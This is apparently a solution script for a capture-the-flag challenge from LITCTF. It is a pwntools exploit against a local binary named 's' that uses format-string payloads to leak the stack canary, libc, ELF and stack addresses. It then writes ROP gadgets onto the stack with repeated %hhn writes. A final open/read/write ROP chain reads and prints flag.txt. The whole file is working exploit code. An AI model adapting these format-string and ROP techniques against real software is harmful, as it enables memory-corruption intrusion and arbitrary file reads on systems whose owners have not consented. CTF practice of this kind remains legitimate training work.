from pwn import *



while(1):
    context.binary = exe = ELF('./s', False)
    libc = ELF('./libc-2.31.so', False)
    io = process()
    #gdb.attach(io, api=True)
    #io = remote('litctf.org', 31792)

    # Stage 1: Leaks
    payload = b"%2hhx"*115 + b"%34c%hhn" + b"%2hhx"*18 + b"%130hhx%hhn" + b"%136$p%140$p%144$p%137$p"
    io.sendline(payload)
    #io.interactive()
    
    io.recvuntil(b'0x')
    canary = int(io.recvuntil(b'0x')[:-2], 16)
    libc.address = int(io.recvuntil(b'0x')[:-2], 16) - (libc.sym['__libc_start_main']+243)
    exe.address = int(io.recvuntil(b'0x')[:-2], 16) - (exe.sym['main'])
    stack = int(io.recvline(keepends=False), 16)
    log.info(f'Canary: {hex(canary)}')
    log.info(f'Libc base: {hex(libc.address)}')
    log.info(f'ELF base: {hex(exe.address)}')
    log.info(f'Stack: {hex(stack)}')
    stack = stack + 0x10

    writable = exe.bss(0x100)
    pop_rdi = libc.address + 0x23b6a
    pop_rsi = libc.address + 0x2601f
    pop_rsi_r15 = exe.address + 0x1521
    pop_rdx = libc.address + 0x142c92
    push_rax = libc.address + 0x42017
    target = stack + 0x40

    cnt = stack & 0xffff
    if(cnt > 0x400):
        io.close()
        continue

    time.sleep(0.2)
    try:
        # Init: make urself a pointer
        payload = f'%174hhx%137$hhn%{cnt-0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        cnt = cnt & 0xff

        log.info("Write pop rdi on stack")
        gad = pop_rdi

        log.info("Write 1st byte")
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 2nd byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 3rd byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 6

        log.info("Write target address on stack")
        gad = target

        log.info("Write 1st byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 2nd byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 3rd byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 4th byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 5th byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 6th byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 3

        log.info("Write pop rdx on stack")
        gad = pop_rdx

        log.info("Write 1st byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 2nd byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 3rd byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 4th byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 5th byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 6th byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 11

        log.info("Write pop rsi r15 on stack")
        gad = pop_rsi_r15

        log.info("Write 1st byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 2nd byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 7

        log.info("Write 0 on stack")
        gad = 0

        log.info("Write 1st byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 2nd byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 3rd byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 4th byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 5th byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 6th byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 11

        log.info("Write read function adddress on stack")
        gad = exe.plt['read']

        log.info("Write 1st byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 1

        log.info("Write 2nd byte")
        payload = f'%174hhx%137$hhn%{0x100 + cnt - 0xae}hhx%157$hnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        payload = f'%174hhx%137$hhn%{0x100 + (gad & 0xff) - 0xae}hhx%170$hhnABCD'.encode()
        io.sendline(payload)
        io.recvuntil(b'ABCD\n')
        gad = gad >> 16
        cnt += 7

        log.info("Finish fmt payload. Now onto ROP!")
        io.sendline(b'./flag.txt\0')
        #io.recvuntil(b'./flag.txt\n')

        payload = p64(pop_rdi+1) + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(writable) + p64(pop_rdx) + p64(100) + p64(libc.sym['read'])
        payload += p64(pop_rdi) + p64(writable) + p64(pop_rsi) + p64(0) + p64(libc.sym['open'])
        payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(writable) + p64(pop_rdx) + p64(100) + p64(libc.sym['read'])
        payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(writable) + p64(pop_rdx) + p64(100) + p64(libc.sym['write'])
        payload += p64(exe.sym['main'])
        io.sendline(payload)
        time.sleep(0.2)
        io.send(b'./flag.txt\0')
        io.interactive()
        break
    except:
        io.close()
        continue

io.interactive()